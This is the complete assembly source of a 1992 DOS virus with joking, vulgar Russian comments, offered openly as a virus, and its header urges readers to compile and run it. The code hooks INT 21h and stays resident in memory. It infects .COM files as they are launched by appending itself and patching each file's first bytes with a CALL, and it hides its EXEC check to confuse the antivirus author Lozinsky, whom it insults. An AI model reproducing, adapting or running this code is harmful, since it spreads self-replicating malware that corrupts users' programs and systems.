;
;	Рекомендуется откомпилировать, запустить и только потом рассматривать
;	source code. (Все равно Вам в нем разбираться придется :-)).
;
;	Миленькая (маленькая) гадость, мерзость, дрянь, скотина...
;
;	В общем, вирус, который заражает всякие там файлы при попытке их
;	запустить - пока с фамилией .COM, живет где-то на чердаке под вектором
;	21-го интеррапта, не скрывает свое тело жирное в утесах, зараженные
;	файлы опознает по шурикену (такой типа звездочки, используется у
;	восточных народов для отсекания головы и еще кое-чего у ближнего 
;	своего), расположенному в 4-ом байте от начала, а свое наличие в
;	памяти проверяет так: кладет в AX слово BABA (в смысле, не такое
;	слово, а word 0BABAh), выполняет 21-е интерраптование и смотрит,
;	желают ли эту бабу 0FACCh. Если желают, то с тачкой все понятно.
;
;	Copyright (c) 1992, Gogi&Givi International
;

.model	tiny
.code
	org	0100h
VirPar	equ	(endvir-StartVirus)/16+2	; Скока у вируса параграфов
VirLen	equ	(endvir-StartVirus)		; Размеры бюста вируса в
						;   треугольных километрах
gadost:
	db	'ш'				; Ето код CALL
	dw	StartVirus-$-2			; А ето смещение на StartVirus
	db	15,09h				; Шурикен и остаток от mov ah,
	int	21h				; А это все нормальный
	ret					;   код жертвы
GoodMessage	db	'Товарищ Лозинский! ФАК Ю!',13,10,'$'
						; Пакостный мессадж для дяди
						;   Лозинского
StartVirus:
	pop	si				; Это чтобы узнать, куда нас
	call	EntryPoint			;   занесло
EntryPoint:
	pop	si				; Выпихнем адрес начала заразы
	push	ds				; Сохраним пару-тройку регистров...
	push	es
	push	si
	mov	ax,cs				; Восстановим спертые байты
	mov	es,ax				;   из задницы файла
	mov	ds,ax
	mov	di,0100h
	add	si,RobbedBytes-EntryPoint
	mov	cx,4
	cld					; Это восстановление
	rep	movsb
	pop	si
	mov	ax,0BABAh			; Проверим, хотят ли бабу - 
	int	21h				;   в смысле, есть ли мы
	cmp	ax,0FACCh			;   в памяти
	jne	NeedsBaba			; Видать, хотят ее, родимую!
	jmp	FucksNow			; Ее уже обрабатывают
NeedsBaba:
	pop	es
	push	es
	mov	ax,es				; Отрываем себе сюгмент PSP
	dec	ax
	mov	es,ax				; Столько в нашей пакости
	mov	ax,es:[3]			;   параграфов
	sub	ax,virpar
	mov	es:[3],ax
	mov	bx,es:[1]			; Плюс одна PSP
	add	bx,ax				; Все сваливаем в кучу
	mov	es,bx
	push	ds				; Ну, это понятно
	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[21h*4]			; Захватываем старый
	mov	cs:[si+Off21-EntryPoint],ax	;   вектор int 21h
	mov	ax,ds:[21h*4+2]			; В смысле, он не старый,
	mov	cs:[si+Seg21-EntryPoint],ax	;   он даже лучше нового
	pop	ds
	xor	di,di				; Засовываем в начало
	push	si				;   ничейного сегмента
	sub	si,EntryPoint-StartVirus	;   где-то на задворках
	mov	cx,VirLen			;   памяти наше гнусное
	rep	movsb				;   тело
	pop	si
	push	ds				; И ставим на указанное
	xor	ax,ax				;   гнусное тело вектор
	mov	ds,ax				;   прерывания 21h
	mov	word ptr ds:[21h*4],Int21Server-StartVirus
	mov	ds:[21h*4+2],es
	pop	ds
	
FucksNow:
	pop	es				; Это в случае, если
	pop	ds				;   предложенной женщиной
	mov	si,0100h			;   (вирусом) уже обладают
	push	si
	xor	ax,ax				; Все восстанавливаем к
	xor	bx,bx				;   ядрене Фене - и домой,
	xor	di,di				;   к маме
	ret
	
Int21Server:
	pushf					; Это новый обработчик
	push	ax				;   21-го инта
	push	bx
	push	ds
	cmp	ax,0BABAh			; Тут мы установим реакцию
	jne	NotTest				;   на предложение женщины
	pop	ds				;   (или эрекцию)
	pop	bx
	pop	ax
	popf
	mov	ax,0FACCh			; Это нормальная эрекция
	iret					; (то есть реакция)
	
NotTest:
	push	cx				; Тут мы классно извратимся,
	mov	cx,ax				;   чтобы сделать вид, что
	xchg	cl,ch				;   нам совсем не нужно
	xor	cl,4Bh				;   обрабатывать функцию EXEC
	pop	cx				; (Чтоб Лозинский голову ломал
	jz	Exec				;   и чтоб у него очки запотели)
	jmp	NotExec
	
Exec:
	mov	bx,dx				; Покладем смещение имени
						;   запускаемого файла в BX
SearchZero:
	cmp	byte ptr ds:[bx],0		; Проверим на зеру
	je	ZeroFound			; Ах, конец имени!
	inc	bx
	jmp	SearchZero

ZeroFound:
	sub	bx,11				; Чудесно!
	push	es				; Проверим, вдруг какой-
	mov	ax,cs				;   нибудь псих желает
	mov	es,ax				;   заразить COMMAND.COM
	mov	cx,11
	mov	di,offset CommandName-StartVirus
	
Compare:
	mov	al,ds:[bx]			; Это все сложная и нудная
	cmp	al,es:[di]			;   процедура проверки...
	jne	NotCommand
	inc	bx
	inc	di
	dec	cx				; Все проверяем, проверяем...
	cmp	cx,0
	jne	Compare
	pop	es
	jmp	Quit21Server			; Что ж я - дебил COMMAND.COM
						;   заражать?!
NotCommand:
	pop	es				; Там мы сохраняли чегой-та
	push	ax
	push	bx				; Сохраним все, что плохо
	push	cx				;   лежит, чтобы не пропало
	push	dx
	mov	ax,3D02h			; Откупориваем клиента (файл)
	int	21h
	jc	EndExec				; Бывают и гнутые пробки
	mov	bx,ax				; Покладем пробку от файла в BX
	mov	cx,4				; Хотелось бы считать 4 байта
	mov	ax,cs
	mov	ds,ax
	mov	ah,3Fh				; В место, где лежали
	mov	dx,offset RobbedBytes-StartVirus
	int	21h				;   спертые байты
	jc	EndExec
	cmp	word ptr cs:[RobbedBytes-StartVirus],'ZM'
	je	CloseFile			; На фига EXE заражать???
	xor	cx,cx
	xor	dx,dx
	mov	ax,4202h
	int	21h				; Лезем в задницу файла
	cmp	ax,1000				; На фига нам файлы меньше
	jl	CloseFile			;    1 кило?
	cmp	ax,64000			; А тем более больше 64
	ja	CloseFile
	sub	ax,3
	mov	cs:[FileSize-StartVirus],ax	; Шурикена ? 
	cmp	byte ptr cs:[RobbedBytes-StartVirus+3],15
	je	CloseFile			; Икебана!
	mov	ax,cs
	mov	ds,ax
	mov	ah,40h				; Глупый вирус робко прячет
	xor	dx,dx				;   тело жирное в заднице файла
	mov	cx,VirLen
	int	21h
	xor	cx,cx				; И в начало убегает, чтобы
	xor	dx,dx				;   JUMP туда поставить
	mov	ax,4200h
	int	21h
	mov	ah,40h
	mov	dx,offset SuperByte-StartVirus	; Файл на то и файл, чтобы
	mov	cx,4				;   вызывать подклеенный
	int	21h				;   сзади вирус
CloseFile:
	mov	ah,3Eh				; Сие закрытие файла - нам
	int	21h				;   он больше вааще не нужен
EndExec:
	pop	dx				; Мы там, кажись, сохраняли
	pop	cx				;   опять чегой-та?
	pop	bx
	pop	ax
	jmp	Quit21Server			; И по бабам!
	
NotExec:
	; На случай следующих хамских разработок

Quit21Server:
	pop	ds				; Чем же мы только
	pop	bx				;   STACK'ан не наполняли?!
	pop	ax
	popf					; Еще и флагами?!!!
	db	0EAh
Off21	dw	0000h				; Так будет с каждым, кто...
Seg21	dw	0000h

RobbedBytes:
	mov	dx,offset GoodMessage		; Это вроде как спертые байты
	db	0B4h
SuperByte	db	'ш'			; А это не спертые, но
FileSize	dw	0000h			;   тоже хорошие
		db	15			; Шурикена
		db	'=>'			; Это для красоты
CommandName	db	'COMMAND.COM<='		; А это от COMMAND.COM
endvir:
end	gadost					; И все!